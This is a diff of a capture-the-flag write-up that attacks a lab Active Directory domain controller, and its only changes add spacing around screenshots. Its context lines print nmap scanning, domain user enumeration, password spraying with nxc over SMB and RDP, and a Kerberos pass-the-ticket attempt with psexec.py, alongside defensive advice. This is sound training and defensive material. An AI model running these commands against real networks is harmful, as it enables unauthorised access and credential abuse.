@@ -11,6 +11,7 @@ Security teams should actively monitor for port‑scanning and reconnaissance ac
 ```
 nmap -sS -p- 10.130.187.188
 ```
+
 <img width="557" height="351" alt="forward_0_nmap_port" src="https://github.com/user-attachments/assets/63d5e2e6-23b8-4e84-8aca-e77c53b20026" />
 
 Here we got some important ports:
@@ -64,11 +65,14 @@ Restrict RDP access to non‑administrative accounts and enforce multi‑factor 
 Host/Domain Enumeration
 =======================
 ``` net user ```
+
 <img width="485" height="255" alt="forward_1_dc_users" src="https://github.com/user-attachments/assets/b17bf299-7813-4ea0-8356-c54f78491abd" />
+
 ```
 net user /domain
 net user j.smith
 ```
+
 <img width="440" height="310" alt="forward_1_dc_user_jsmith" src="https://github.com/user-attachments/assets/d4ab2dd2-c440-4bca-a049-e979f433503c" />
 
 As the target was a Domain Controller, local accounts were effectively domain accounts because the local SAM database is replaced with the ntds.dit database. The results were identical, and the domain name (e.g., ctf.local) was not required as a prefix. Group details confirmed why we were able to log in via RDP.
@@ -100,11 +104,14 @@ Password spraying revealed valid credentials for r.williams.
 nxc smb 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
 nxc rdp 10.130.187.188 -u users.txt -p "redacted" --continue-on-success
 ```
+
 <img width="947" height="245" alt="forward_3_dc_user_rwilliams_creds" src="https://github.com/user-attachments/assets/8f3e6676-8115-4d92-8b66-3c65539239e6" />
+
 ```
 net user r.williams
 net localgroup sysadmin
 ```
+
 <img width="362" height="303" alt="forward_3_dc_user_rwilliams" src="https://github.com/user-attachments/assets/4751a9c6-1f2a-4b04-899d-06e60aba9225" />
 
 On the desktop, there was an automation notice in the r.williams folder.
@@ -121,6 +128,7 @@ ticketConverter.py share/ticket.kirbi cool.ccache
 export KRB5CCNAME=cool.ccache
 psexec.py ctf.local\svc.scanner@10.130.187.188 -k -no-pass -dc-ip 10.130.187.188
 ```
+
 <img width="551" height="366" alt="forward_4_dc_ticket_expire" src="https://github.com/user-attachments/assets/d0aa6268-558a-4b29-8ba7-c6e5eb448755" />
 
 We attempted to use a base64‑encoded Kerberos ticket for pass‑the‑ticket, but the ticket had already expired.
